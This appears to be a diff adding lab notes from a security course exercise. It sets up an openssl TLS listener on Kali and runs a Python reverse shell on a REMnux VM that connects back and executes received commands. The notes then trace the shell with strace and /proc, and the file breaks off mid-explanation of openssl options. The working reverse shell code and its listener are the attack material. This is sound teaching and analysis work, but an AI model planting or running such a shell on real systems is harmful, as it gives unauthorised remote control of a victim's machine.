@@ -1,0 +1,389 @@
+# kali 192.168.159.128, Remnux 192.168.159.129
+#
+# setup listner
+
+┌──(kali㉿kali)-[~]
+└─$ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+..............+......+.......+...+..+.+......+..............+.+......+..+...+....+........+.+++++++++++++++++++++++++++++++++++++++*.........+............+.....+++++++++++++++++++++++++++++++++++++++*.+...+.........+.........+...........+.+..+.+...........+......+.......+.................+....+..+.......+........+.............+.....+......+.+........+......+...+.............+.........+...+...+.....+...+.........+...............+.............+..+...+....+...............+.....+.++++++
+.+.+.....+......+....+++++++++++++++++++++++++++++++++++++++*..................+.....+...+............+.......+...+......+......+...+++++++++++++++++++++++++++++++++++++++*.........+......+.....+.+.....+...................++++++
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:CA
+State or Province Name (full name) [Some-State]:ON
+Locality Name (eg, city) []:Kingston
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:CTU
+Organizational Unit Name (eg, section) []:DP1.2
+Common Name (e.g. server FQDN or YOUR name) []:pyrat1
+Email Address []:pyrat1@localhost.localdomain
+
+
+┌──(kali㉿kali)-[~]
+└─$ cat cert.pem                                                        
+-----BEGIN CERTIFICATE-----
+MIID9zCCAt+gAwIBAgIUUcrjHYmORGlrs4uSMlQziWFr61kwDQYJKoZIhvcNAQEL
+BQAwgYoxCzAJBgNVBAYTAkNBMQswCQYDVQQIDAJPTjESMBAGA1UEBwwJS2luZ3N0
+aW9uMQwwCgYDVQQKDANDVFUxDjAMBgNVBAsMBURQMS4yMQ8wDQYDVQQDDAZweXJh
+dDExKzApBgkqhkiG9w0BCQEWHHB5cmF0MUBsb2NhbGhvc3QubG9jYWxkb21haW4w
+HhcNMjUwNTI0MTY1MjAyWhcNMjYwNTI0MTY1MjAyWjCBijELMAkGA1UEBhMCQ0Ex
+CzAJBgNVBAgMAk9OMRIwEAYDVQQHDAlLaW5nc3Rpb24xDDAKBgNVBAoMA0NUVTEO
+MAwGA1UECwwFRFAxLjIxDzANBgNVBAMMBnB5cmF0MTErMCkGCSqGSIb3DQEJARYc
+cHlyYXQxQGxvY2FsaG9zdC5sb2NhbGRvbWFpbjCCASIwDQYJKoZIhvcNAQEBBQAD
+ggEPADCCAQoCggEBALILjvmoyTTO0gMrT9yl7bZIWBFW7FUKsGD4Qx2En0giz1gq
+PiysXKLd6itKLSmS38d0pmP0u0bWHgdbE+GAQ+j9NxWEby8ImtIsNTrxV2fTHXeB
+ucuoSDEsLL55f0aVFQaJqWdvXbRsZdoGdA2FyDd+2+0BXHtp1fKxX6ZCsI1Gbmga
+npuPRbV1agYf8U6F/sNM1+4PK+75fXuBZeEkgPECIJysTAfPr06XkyvUCq66uHGc
+orA7siZbvte3VgD3HIHiF2ytGsH/7wyJx68c6SUKffPimnIJYw0f+/h6ai9ew5Zz
+WjzRE2zfrgWoC9RZe5h1rPemponiGRc/iOFOEM0CAwEAAaNTMFEwHQYDVR0OBBYE
+FDTBo9waM4OEL84aYcIRamL5dOhlMB8GA1UdIwQYMBaAFDTBo9waM4OEL84aYcIR
+amL5dOhlMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAII6xwuK
+3sL/J8BlhAFBYhcZtgH+Fj+j6918iO/RDyFJK7Cr4fr9lKgcD5OuVo3ev6wzlj1D
++gNJTAR2+4MK1Q6XKuInCyU9HEbZYhbtBU/BhlaZ1V0YvqS1Wote9q07VZUm3qw5
+4gNWyvP2OomTOhmloXZFjK9nRitPURM6WebrPp8MqldA3HA2eLJcm7OpD/ItDJBS
+8yVYk3YTKduckZUJpNmMZCEAuu+IXBh/peeIY0P3j27twiXQ/cNmYXt+R4pfbhVl
+Jen87cWJ9+s2I4Fs4yWAf+n44Vpun535tYAq0/BKs7asvde/jwoCvEhtT89dTCzi
+sv7iCmsVsfWqZr8=
+-----END CERTIFICATE-----
+                                                                                                                                                                                                                         
+┌──(kali㉿kali)-[~]
+└─$ cat key.pem 
+-----BEGIN PRIVATE KEY-----
+MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCyC475qMk0ztID
+K0/cpe22SFgRVuxVCrBg+EMdhJ9IIs9YKj4srFyi3eorSi0pkt/HdKZj9LtG1h4H
+WxPhgEPo/TcVhG8vCJrSLDU68Vdn0x13gbnLqEgxLCy+eX9GlRUGialnb120bGXa
+BnQNhcg3ftvtAVx7adXysV+mQrCNRm5oGp6bj0W1dWoGH/FOhf7DTNfuDyvu+X17
+gWXhJIDxAiCcrEwHz69Ol5Mr1AquurhxnKKwO7ImW77Xt1YA9xyB4hdsrRrB/+8M
+icevHOklCn3z4ppyCWMNH/v4emovXsOWc1o80RNs364FqAvUWXuYdaz3pqaJ4hkX
+P4jhThDNAgMBAAECggEABSZHbtoeY6wdr+DHUQrtiqmh/nJkqHsEKfHUQxzMXJJB
+K/wgyzr6/OztMm5VSxAH7+VkUJzJ890KhkzwkMOcczcrqjAn5RTbIXwM2BUV4Zde
+EVBLtuO5ns53xtSNxVVXg9Zkc2zpqWe/NGSeY6u8ZDqDkuHIsnsXqIrPyOfB4nwc
+F+hzOajesEANqfuSXaZK3cvCazLW8LN6d5mNCkR3zUzPQ/22y51UBVTKGzWBRuAn
+JBBT12/rfV8DEAER4oQKL1Ked/YLQ5mS/MiIDNK3l3XCkULWoTmKGSsHstfmX89l
+7CIhwLEYq0f22Uecqpp8X2wrIlb0CWZFv9flS8I8wwKBgQDswbuo36tMoLmLTmL5
+iRf38fZg59p/psiVQ/v/WRVSQEKtZWR4EZEXvunrHgRjXzGOVIWFR1DQ1vC8Iklm
+S48dEnfhY4cu9gyfn+GNbHM3uauNegl+fxLNq8npnyxQBgWJHjN5X20+RlmzqXgn
+EUA0IrpKiNIPG7OKOMdZQKboCwKBgQDAhDIaYxPwSTz+7IN0Q3veJ1oVHSFonPM7
+IZJqIpAm9LvcuN7IXsL/MhwS4k7PtXIRTSy8mx+P5jVm6yoEkDVTDcudenWBsLDZ
+veQl0abeTUXzPeVHbcZB0dI08MIE3Jl75oQY7+nCmMNpRrfnKf3MXjn+Fa5jHaV0
+lbjKuCX5hwKBgB44GCjU67trJGOojK+HFR0bsDPsRBJZCm8q70ZHa5ZFB320XF+K
+9ncOcjMFcM/yPZQKK8S4NpOBa9bHlZDOAiVWzyBgoMeYtkHFmXeAqTAqrb/wHLgd
+phvEWpBMNc69BgXbafyK9pmlRxvMfL6X0BcXe6m5zv4IriDtYFx/CQ7DAoGAcofy
++snI2eHoXMy+Y9OmBIMqz3bWIlOFTL9rSKMpWVOt0+FUAKaHoaThGMb0FhQfOXXN
+UKOEwmo1iPYMuExGvRNu+FAbSj2g6NlUur8gZA5auBwxpC4FjbDTOtWkx5mp4hFA
+s0k/q5qQXrhIvki4CfZgz+18ItFHVrWgC1JEnU8CgYARQlKKZMEYIAlVaS9+D8jL
+x604WbtyKVndv5C+FKsx/JSlxeqnwL02v/QKGGq5Px2KQWbG5y+j0nd5Rqoe6pFE
+LyUZbv1RujtwsXLflqIE3DF7gRmk/aX/TxXvKb08f2YOaqDRh2S2yUjD/pqqHVFD
+h66a7Dj1U7iiVwvimtEOaw==
+-----END PRIVATE KEY-----
+                                                                                                                                                                                                                         
+┌──(kali㉿kali)-[~]
+└─$ 
+┌──(kali㉿kali)-[~]
+└─$ openssl s_server -key key.pem -cert cert.pem -accept 444
+Using default temp DH parameters
+ACCEPT
+
+#
+# start pyrat1_ssl
+
+remnux@remnux:~/temp$ cat pyrat1_ssl.py 
+import os
+import subprocess
+import socket
+import ssl
+
+so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+so.connect(('192.168.159.128', 444))
+s = ssl.wrap_socket(so)  # python version <=3.7
+
+xE = False
+while not xE:
+    data = s.recv(1024)
+    if len(data) == 0:
+        xE = True
+    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    stdout_value = proc.stdout.read() + proc.stderr.read()
+    s.sendall(stdout_value)
+remnux@remnux:~/temp$ python2 pyrat1_ssl.py 
+
+# check pid, which is 4405
+remnux@remnux:~/temp$ ps u
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+remnux       841  0.0  0.0 164020  6536 tty2     Ssl+ May23   0:00 /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=
+remnux       843  0.0  1.3 342824 111396 tty2    Sl+  May23   1:19 /usr/lib/xorg/Xorg vt2 -displayfd 3 -auth /run/user/1000/gdm/Xauthorit
+remnux       882  0.0  0.1 188216 13624 tty2     Sl+  May23   0:00 /usr/libexec/gnome-session-binary --systemd --systemd --session=ubuntu
+remnux      1398  0.0  0.0  11264  5656 pts/0    Ss   May23   0:00 bash
+remnux      3502  0.0  0.0  11136  5368 pts/1    Ss+  09:59   0:00 bash
+remnux      3590  0.0  0.0  11136  5512 pts/2    Ss+  10:28   0:00 bash
+remnux      3825  0.0  0.0  11264  5720 pts/3    Ss   13:02   0:00 bash
+remnux      4405  0.0  0.1  20940 11912 pts/0    S+   19:01   0:00 python2 pyrat1_ssl.py
+remnux      4407  0.0  0.0  11488  3232 pts/3    R+   19:03   0:00 ps u
+remnux@remnux:~/temp$ 
+
+remnux@remnux:/proc/4405/fd$ ll
+total 0
+dr-x------ 2 remnux remnux  0 May 24 19:05 ./
+dr-xr-xr-x 9 remnux remnux  0 May 24 19:03 ../
+lrwx------ 1 remnux remnux 64 May 24 19:05 0 -> /dev/pts/0
+lrwx------ 1 remnux remnux 64 May 24 19:05 1 -> /dev/pts/0
+lrwx------ 1 remnux remnux 64 May 24 19:05 2 -> /dev/pts/0
+lrwx------ 1 remnux remnux 64 May 24 19:05 3 -> 'socket:[159542]'
+remnux@remnux:/proc/4405/fd$ 
+
+remnux@remnux:~/temp$ sudo strace -p4405
+strace: Process 4405 attached
+read(3, 
+
+# on kali type in id, whoami
+┌──(kali㉿kali)-[~]
+└─$ openssl s_server -key key.pem -cert cert.pem -accept 444 
+Using default temp DH parameters
+ACCEPT
+-----BEGIN SSL SESSION PARAMETERS-----
+MIGDAgEBAgIDBAQCEwIEIMlOSHGHbaQow2SsSvKmByZPZId41ZlbZ4n8J6Z62HRt
+BDCClNOaEynC8szOSB6R1/UuuTjbpGQfdHvtdbwzA8Uan57CxX2WJuiZMpIvoqbh
+7MuhBgIEaDJPn6IEAgIcIKQGBAQBAAAArgcCBQDD9oe3swMCAR0=
+-----END SSL SESSION PARAMETERS-----
+Shared ciphers:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-DSS-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:DHE-DSS-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-CCM8:ECDHE-ECDSA-AES256-CCM:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-CCM8:DHE-RSA-AES256-CCM:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA256:DHE-RSA-AES256-SHA:DHE-DSS-AES256-SHA:ECDHE-ECDSA-AES128-CCM8:ECDHE-ECDSA-AES128-CCM:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES128-CCM8:DHE-RSA-AES128-CCM:DHE-RSA-AES128-SHA256:DHE-DSS-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA:ECDHE-ECDSA-ARIA256-GCM-SHA384:ECDHE-ARIA256-GCM-SHA384:ECDHE-ECDSA-ARIA128-GCM-SHA256:ECDHE-ARIA128-GCM-SHA256:ECDHE-ECDSA-CAMELLIA256-SHA384:ECDHE-RSA-CAMELLIA256-SHA384:ECDHE-ECDSA-CAMELLIA128-SHA256:ECDHE-RSA-CAMELLIA128-SHA256:DHE-DSS-ARIA256-GCM-SHA384:DHE-RSA-ARIA256-GCM-SHA384:DHE-DSS-ARIA128-GCM-SHA256:DHE-RSA-ARIA128-GCM-SHA256:DHE-RSA-CAMELLIA256-SHA256:DHE-DSS-CAMELLIA256-SHA256:DHE-RSA-CAMELLIA128-SHA256:DHE-DSS-CAMELLIA128-SHA256:DHE-RSA-CAMELLIA256-SHA:DHE-DSS-CAMELLIA256-SHA:DHE-RSA-CAMELLIA128-SHA:DHE-DSS-CAMELLIA128-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-CCM8:AES256-CCM:AES128-CCM8:AES128-CCM:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA:ARIA256-GCM-SHA384:ARIA128-GCM-SHA256:CAMELLIA256-SHA256:CAMELLIA128-SHA256:CAMELLIA256-SHA:CAMELLIA128-SHA
+Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:ed25519:ed448:rsa_pss_pss_sha256:rsa_pss_pss_sha384:rsa_pss_pss_sha512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224:DSA+SHA224:DSA+SHA256:DSA+SHA384:DSA+SHA512
+Shared Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:ed25519:ed448:rsa_pss_pss_sha256:rsa_pss_pss_sha384:rsa_pss_pss_sha512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224
+Supported groups: x25519:secp256r1:x448:secp521r1:secp384r1
+Shared groups: x25519:secp256r1:x448:secp521r1:secp384r1
+CIPHER is TLS_AES_256_GCM_SHA384
+This TLS version forbids renegotiation.
+ERROR
+40D74968527F0000:error:0A000126:SSL routines::unexpected eof while reading:../ssl/record/rec_layer_s3.c:691:
+shutting down SSL
+CONNECTION CLOSED
+-----BEGIN SSL SESSION PARAMETERS-----
+MIGDAgEBAgIDBAQCEwIEIH4RDn1PqhuXq8ZRrq5LaDQ/x1RYYYxLoGApsBwvZsvX
+BDBd34T/BLnRJllbecpYSuAYnI6AgnOMIOFMLuzlc5qgdB5SrkViB4g9KCQtWjDY
+B3KhBgIEaDJQSqIEAgIcIKQGBAQBAAAArgcCBQChMQpcswMCAR0=
+-----END SSL SESSION PARAMETERS-----
+Shared ciphers:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-DSS-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:DHE-DSS-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-CCM8:ECDHE-ECDSA-AES256-CCM:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-CCM8:DHE-RSA-AES256-CCM:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA256:DHE-RSA-AES256-SHA:DHE-DSS-AES256-SHA:ECDHE-ECDSA-AES128-CCM8:ECDHE-ECDSA-AES128-CCM:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES128-CCM8:DHE-RSA-AES128-CCM:DHE-RSA-AES128-SHA256:DHE-DSS-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA:ECDHE-ECDSA-ARIA256-GCM-SHA384:ECDHE-ARIA256-GCM-SHA384:ECDHE-ECDSA-ARIA128-GCM-SHA256:ECDHE-ARIA128-GCM-SHA256:ECDHE-ECDSA-CAMELLIA256-SHA384:ECDHE-RSA-CAMELLIA256-SHA384:ECDHE-ECDSA-CAMELLIA128-SHA256:ECDHE-RSA-CAMELLIA128-SHA256:DHE-DSS-ARIA256-GCM-SHA384:DHE-RSA-ARIA256-GCM-SHA384:DHE-DSS-ARIA128-GCM-SHA256:DHE-RSA-ARIA128-GCM-SHA256:DHE-RSA-CAMELLIA256-SHA256:DHE-DSS-CAMELLIA256-SHA256:DHE-RSA-CAMELLIA128-SHA256:DHE-DSS-CAMELLIA128-SHA256:DHE-RSA-CAMELLIA256-SHA:DHE-DSS-CAMELLIA256-SHA:DHE-RSA-CAMELLIA128-SHA:DHE-DSS-CAMELLIA128-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-CCM8:AES256-CCM:AES128-CCM8:AES128-CCM:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA:ARIA256-GCM-SHA384:ARIA128-GCM-SHA256:CAMELLIA256-SHA256:CAMELLIA128-SHA256:CAMELLIA256-SHA:CAMELLIA128-SHA
+Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:ed25519:ed448:rsa_pss_pss_sha256:rsa_pss_pss_sha384:rsa_pss_pss_sha512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224:DSA+SHA224:DSA+SHA256:DSA+SHA384:DSA+SHA512
+Shared Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:ed25519:ed448:rsa_pss_pss_sha256:rsa_pss_pss_sha384:rsa_pss_pss_sha512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224
+Supported groups: x25519:secp256r1:x448:secp521r1:secp384r1
+Shared groups: x25519:secp256r1:x448:secp521r1:secp384r1
+CIPHER is TLS_AES_256_GCM_SHA384
+This TLS version forbids renegotiation.
+id
+uid=1000(remnux) gid=1000(remnux) groups=1000(remnux),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),133(wireshark)
+whoami
+remnux
+
+# on rumnux
+remnux@remnux:/proc/4405/fd$ ll
+total 0
+dr-x------ 2 remnux remnux  0 May 24 19:05 ./
+dr-xr-xr-x 9 remnux remnux  0 May 24 19:03 ../
+lrwx------ 1 remnux remnux 64 May 24 19:05 0 -> /dev/pts/0
+lrwx------ 1 remnux remnux 64 May 24 19:05 1 -> /dev/pts/0
+lrwx------ 1 remnux remnux 64 May 24 19:05 2 -> /dev/pts/0
+lrwx------ 1 remnux remnux 64 May 24 19:05 3 -> 'socket:[159542]'
+remnux@remnux:/proc/4405/fd$ ll
+total 0
+dr-x------ 2 remnux remnux  0 May 24 19:05 ./
+dr-xr-xr-x 9 remnux remnux  0 May 24 19:03 ../
+lrwx------ 1 remnux remnux 64 May 24 19:05 0 -> /dev/pts/0
+lrwx------ 1 remnux remnux 64 May 24 19:05 1 -> /dev/pts/0
+lr-x------ 1 remnux remnux 64 May 24 19:08 11 -> 'pipe:[162274]'
+lrwx------ 1 remnux remnux 64 May 24 19:05 2 -> /dev/pts/0
+lrwx------ 1 remnux remnux 64 May 24 19:05 3 -> 'socket:[159542]'
+l-wx------ 1 remnux remnux 64 May 24 19:08 7 -> 'pipe:[162272]'
+lr-x------ 1 remnux remnux 64 May 24 19:08 9 -> 'pipe:[162273]'
+remnux@remnux:/proc/4405/fd$ 
+
+remnux@remnux:~/temp$ sudo strace -p4405
+strace: Process 4405 attached
+read(3, "\27\3\3\0\24", 5)              = 5
+read(3, "]6\6\303-\20\342\337#\227 \274\v\31\267\322\302O\232}", 20) = 20
+pipe([4, 5])                            = 0
+fcntl(4, F_GETFD)                       = 0
+fcntl(4, F_SETFD, FD_CLOEXEC)           = 0
+fcntl(5, F_GETFD)                       = 0
+fcntl(5, F_SETFD, FD_CLOEXEC)           = 0
+pipe([6, 7])                            = 0
+fcntl(6, F_GETFD)                       = 0
+fcntl(6, F_SETFD, FD_CLOEXEC)           = 0
+fcntl(7, F_GETFD)                       = 0
+fcntl(7, F_SETFD, FD_CLOEXEC)           = 0
+pipe([8, 9])                            = 0
+fcntl(8, F_GETFD)                       = 0
+fcntl(8, F_SETFD, FD_CLOEXEC)           = 0
+fcntl(9, F_GETFD)                       = 0
+fcntl(9, F_SETFD, FD_CLOEXEC)           = 0
+pipe([10, 11])                          = 0
+fcntl(10, F_GETFD)                      = 0
+fcntl(10, F_SETFD, FD_CLOEXEC)          = 0
+fcntl(11, F_GETFD)                      = 0
+fcntl(11, F_SETFD, FD_CLOEXEC)          = 0
+clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f009d7e4a10) = 4421
+close(11)                               = 0
+mmap(NULL, 1052672, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f009cb7c000
+read(10, "", 1048576)                   = 0
+munmap(0x7f009cb7c000, 1052672)         = 0
+close(4)                                = 0
+close(7)                                = 0
+close(9)                                = 0
+close(10)                               = 0
+fstat(5, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+fcntl(5, F_GETFL)                       = 0x1 (flags O_WRONLY)
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+fcntl(6, F_GETFL)                       = 0 (flags O_RDONLY)
+fstat(8, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+fcntl(8, F_GETFL)                       = 0 (flags O_RDONLY)
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(6, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(6, "uid=10", 6)                    = 6
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(6, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(6, "00(rem", 6)                    = 6
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=4421, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(6, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(6, "nux) gi", 7)                   = 7
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(6, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(6, "d=1000(r", 8)                  = 8
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(6, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(6, "emnux) gr", 9)                 = 9
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(6, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(6, "oups=1000(", 10)               = 10
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(6, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(6, "remnux),4(a", 11)              = 11
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(6, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(6, "dm),24(cdrom)", 13)            = 13
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(6, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(6, ",27(sudo),30(d", 14)           = 14
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(6, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(6, "ip),46(plugdev),", 16)         = 16
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(6, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(6, "114(lpadmin),115(s", 18)       = 18
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(6, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(6, "ambashare),133(wires", 20)     = 20
+fstat(6, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(6, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(6, "hark)\n", 23)                  = 6
+read(6, "", 17)                         = 0
+fstat(8, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(8, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(8, "", 6)                          = 0
+write(3, "\27\3\3\0\241X\367\252{\243\371sD\354\27/\\\231\234B+)J]\300\234\303\337\226\3330p"..., 166) = 166
+read(3, "\27\3\3\0\30", 5)              = 5
+read(3, "\362f\231\24\36\244zm\207\3004\347\255\r\215\236\376\36\r\232,6\334-", 24) = 24
+pipe([4, 7])                            = 0
+fcntl(4, F_GETFD)                       = 0
+fcntl(4, F_SETFD, FD_CLOEXEC)           = 0
+fcntl(7, F_GETFD)                       = 0
+fcntl(7, F_SETFD, FD_CLOEXEC)           = 0
+pipe([9, 10])                           = 0
+fcntl(9, F_GETFD)                       = 0
+fcntl(9, F_SETFD, FD_CLOEXEC)           = 0
+fcntl(10, F_GETFD)                      = 0
+fcntl(10, F_SETFD, FD_CLOEXEC)          = 0
+pipe([11, 12])                          = 0
+fcntl(11, F_GETFD)                      = 0
+fcntl(11, F_SETFD, FD_CLOEXEC)          = 0
+fcntl(12, F_GETFD)                      = 0
+fcntl(12, F_SETFD, FD_CLOEXEC)          = 0
+pipe([13, 14])                          = 0
+fcntl(13, F_GETFD)                      = 0
+fcntl(13, F_SETFD, FD_CLOEXEC)          = 0
+fcntl(14, F_GETFD)                      = 0
+fcntl(14, F_SETFD, FD_CLOEXEC)          = 0
+clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f009d7e4a10) = 4424
+close(14)                               = 0
+brk(0x563ba1bf5000)                     = 0x563ba1bf5000
+read(13, "", 1048576)                   = 0
+close(4)                                = 0
+close(10)                               = 0
+close(12)                               = 0
+close(13)                               = 0
+fstat(7, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+fcntl(7, F_GETFL)                       = 0x1 (flags O_WRONLY)
+fstat(9, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+fcntl(9, F_GETFL)                       = 0 (flags O_RDONLY)
+fstat(11, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+fcntl(11, F_GETFL)                      = 0 (flags O_RDONLY)
+wait4(4421, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], WNOHANG, NULL) = 4421
+close(6)                                = 0
+close(5)                                = 0
+close(8)                                = 0
+fstat(9, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(9, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(9, "remnux", 6)                    = 6
+fstat(9, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(9, 0, SEEK_CUR)                   = -1 ESPIPE (Illegal seek)
+read(9, "\n", 6)                        = 1
+read(9, "", 5)                          = 0
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=4424, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+fstat(11, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+lseek(11, 0, SEEK_CUR)                  = -1 ESPIPE (Illegal seek)
+read(11, "", 6)                         = 0
+write(3, "\27\3\3\0\30\37y\340|\3\344\370\251\337'\315\250\200\36\214\355 DO\307U\4\350\374", 29) = 29
+read(3, 
+
+###############################################################################
+#Explanation of the openssl req command
+
+openssl (OpenSSL command)
+req
+PKCS#10 certificate request and certificate generating utility.
+
+-x509
+this option outputs a self signed certificate instead of a certificate request. This is typically used to generate a test certificate or a self signed root CA. The extensions added to the certificate (if any) are specified in the configuration file. Unless specified using the set_serial option, a large random number will be used for the serial number.
+
+-newkey rsa:2048
+this option creates a new certificate request and a new private key. The argument takes one of several forms. rsa:nbits, where nbits is the number of bits, generates an RSA key nbits in size. If nbits is omitted, i.e. -newkey rsa specified, the default key size, specified in the configuration file is used.
+
+-keyout key.pem
+this gives the filename to write the newly created private key to. If this option is not specified then the filename present in the configuration file is used.
+
+-out cert.pem
+This specifies the output filename to write to or standard output by default.
+
+-days 365
+when the -x509 option is being used this specifies the number of days to certify the certificate for. The default is 30 days.
+
+-nodes
+if this option is specified then if a private key is created it will not be encrypted.
+
+#Explanation of the openssl s_server command
+
+openssl
+s_server
+The s_server command implements a generic SSL/TLS server which listens for connections on a given port using SSL/TLS.
+
+-key key.pem
+The private key to use. If not specified then the certificate file will be used.
+
+-cert cert.pem
